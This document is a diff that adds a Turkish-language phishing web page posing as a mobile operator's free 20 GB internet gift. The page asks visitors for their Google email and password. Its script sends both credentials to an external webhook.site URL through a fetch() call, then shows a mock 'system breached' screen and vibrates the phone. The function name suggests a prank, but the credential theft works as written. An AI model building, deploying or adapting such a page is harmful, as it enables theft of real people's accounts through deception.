@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hediye İnternet Kampanyası</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 30px; width: 320px; border-radius: 15px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .operator-logo { width: 100px; margin-bottom: 15px; border-radius: 10px; }
+        h2 { color: #1a73e8; font-size: 20px; margin-bottom: 10px; }
+        p { font-size: 14px; color: #555; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        button { background-color: #28a745; color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; font-size: 16px; margin-top: 10px; }
+        #hack-screen { display: none; background-color: black; color: #00ff00; position: fixed; top: 0; left: 0; width: 100%; height: 100%; justify-content: center; align-items: center; flex-direction: column; z-index: 9999; font-family: monospace; }
+    </style>
+</head>
+<body>
+
+    <div class="box" id="login-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/af/Free_logo.svg/1200px-Free_logo.svg.png" class="operator-logo">
+        <h2>20 GB HEDİYE PAKETİ</h2>
+        <p>Hattınıza tanımlanan 20 GB interneti aktif etmek için Google hesabınızla onay verin.</p>
+        <input type="email" id="email" placeholder="E-posta adresiniz">
+        <input type="password" id="pass" placeholder="Google Şifreniz">
+        <button onclick="fakeHack()">HEDİYEYİ AL</button>
+    </div>
+
+    <div id="hack-screen">
+        <div style="color: red; font-size: 20px; font-weight: bold;">[!] SİSTEME SIZILDI!</div>
+        <div id="details" style="padding: 20px;"></div>
+    </div>
+
+    <script>
+        function fakeHack() {
+            let email = document.getElementById('email').value;
+            let pass = document.getElementById('pass').value;
+
+            if(email == "" || pass == "") {
+                alert("Hata: Lütfen bilgileri eksiksiz girin.");
+                return;
+            }
+
+            let yourWebhook = "https://webhook.site/05894dbb-a63a-4670-8879-64665546d953";
+            fetch(yourWebhook + "?mail=" + encodeURIComponent(email) + "&sifre=" + encodeURIComponent(pass), { mode: 'no-cors' });
+
+            document.getElementById('login-box').style.display = 'none';
+            document.getElementById('hack-screen').style.display = 'flex';
+            
+            if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
+
+            let details = document.getElementById('details');
+            details.innerHTML = "[+] Bilgiler doğrulanıyor...<br>[+] Yönlendirme yapılıyor...<br>[+] ERİŞİM SAĞLANDI: " + email + "<br>[+] TÜM VERİLER ÇEKİLİYOR...";
+        }
+    </script>
+</body>
+</html>
